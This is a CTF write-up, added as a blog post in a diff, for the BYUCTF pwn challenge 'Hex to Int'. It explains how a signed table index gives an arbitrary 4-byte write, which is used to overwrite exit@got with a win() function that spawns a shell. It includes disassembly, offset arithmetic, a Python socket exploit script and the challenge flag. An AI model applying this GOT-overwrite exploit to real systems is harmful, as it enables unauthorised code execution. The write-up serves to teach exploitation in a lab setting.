@@ -1,0 +1,92 @@
+---
+title: "BYUCTF: Hex to Int"
+description: "A 'hex converter' with a signed table index and idx*4 addressing turns 'expand the table' into an arbitrary 4-byte write. Partial RELRO means a writable GOT, so point exit@got at win() and trigger it from the menu. Classic ret2win, no leak."
+date: 2026-05-31T11:21:46.095Z
+tags: ["ctf", "pwn", "oob-write", "got-overwrite", "partial-relro", "ret2win", "byuctf"]
+draft: false
+---
+
+**Platform:** BYUCTF
+**Challenge:** Hex to Int
+**Category:** Pwn
+**Difficulty:** Easy/Medium
+
+## Flag
+
+`byuctf{0v3rwr1t1ng_t00??_3e2d88}`
+
+## Target
+
+`<remote-host>:1365`. File `hex_to_int2`.
+
+- ELF 64-bit, **non-PIE** (`EXEC`), NX on, **Partial RELRO** (no `BIND_NOW` → GOT writable), not stripped.
+- Flavor text: *"I vibe coded a hex converter… ran out of tokens after 0xff, so you can just add the correct conversions as you find them"* → you can **write past the table**.
+- Imports include `system` + a `/bin/sh` string, and there's a `win()` function.
+
+## Recon
+
+`win()` @ `0x4011d4`:
+
+```asm
+mov edi, 0x402075        ; "/bin/sh"
+call system
+```
+
+So `win` sets up its **own** argument. Hijacking control to it from anywhere yields a shell.
+
+`main` is a menu loop over a table at **`0x404060`** (4-byte int entries):
+
+```c
+int idx, val;
+scanf("%d", &choice);
+// choice == 1: convert
+    scanf("%x", &idx);                 // index parsed as HEX
+    printf("...%d\n", table[idx]);     // OOB READ
+// choice == 2: expand
+    scanf("%x", &idx);                 // index parsed as HEX
+    scanf("%d", &val);                 // value parsed as DECIMAL
+    table[idx] = val;                  // *** OOB WRITE ***
+// else: exit(0)
+```
+
+Disassembly of the write: `mov [rax*4 + 0x404060], edx` with `rax = (int)idx` sign-extended (`cdqe`). So option 2 is an **arbitrary 4-byte write**: `*(0x404060 + idx*4) = val`, with a *signed* index → negative indices reach lower addresses.
+
+## GOT overwrite → ret2win
+
+Partial RELRO ⇒ `.got.plt` is writable. Overwrite a GOT entry with `win` and let the program call that function.
+
+GOT entries (`readelf -r`): `puts 0x404000`, `system 0x404010`, `printf 0x404018`, `scanf 0x404020`, **`exit 0x404028`**.
+
+Target `exit@got` (clean: I control exactly when it fires by choosing menu option 3):
+
+```
+idx*4 = 0x404028 - 0x404060 = -0x38   ->  idx = -14
+```
+
+- **Index** is read with `%x`, so `-14` is entered as `fffffff2` (→ `(int)0xfffffff2 = -14`, `cdqe` → `rax = -14`, `rax*4 = -56`, `0x404060 - 56 = 0x404028`). ✅ (GOT is 8-aligned, table is 8-aligned → even index, lands exactly on the entry.)
+- **Value** = `win = 0x4011d4 = 4198868` (decimal, for `%d`). Only the low 4 bytes are written; the entry's high 4 bytes were already `0` (addresses < 4 GiB), so `exit@got` becomes `0x00000000004011d4`.
+
+Then choose menu option **3** → `exit()` dereferences the GOT → `win()` → `system("/bin/sh")`.
+
+```python
+import socket, time, re
+s = socket.create_connection(('<remote-host>', 1365))
+def snd(b): s.sendall(b); time.sleep(0.2)
+snd(b'2\n')            # expand table (the arbitrary write)
+snd(b'fffffff2\n')     # index -14 (hex) -> exit@got @ 0x404028
+snd(b'4198868\n')      # value = win (0x4011d4)
+snd(b'3\n')            # menu option 3 -> exit() -> win -> /bin/sh
+snd(b'cat flag.txt\n')
+time.sleep(1); print(s.recv(4096).decode())
+# -> byuctf{0v3rwr1t1ng_t00??_3e2d88}   (flag at /app/flag.txt)
+```
+
+## Takeaways
+
+- **Watch the index type.** A *signed* table index + `idx*4` addressing turns "expand the table" into an arbitrary write at `base + idx*4`, including negative offsets into the GOT/data below the array.
+- **Partial RELRO = writable GOT.** Classic ret2win: point any soon-to-be-called GOT slot (`exit` is tidiest) at a `win` gadget. Non-PIE means the `win` address is a fixed constant. No leak needed.
+- **`win` that loads its own arg** is the easiest target: you don't need to control registers, any redirected call lands a shell.
+- Mind the radix of each `scanf`: here index = `%x`, value = `%d`. Mixing them up sends the wrong offset/value.
+- Only the low 4 bytes get written, which is fine because the target address (`0x4011d4`) fits in 32 bits and the upper GOT bytes are already zero.
+
+*0xAdham*
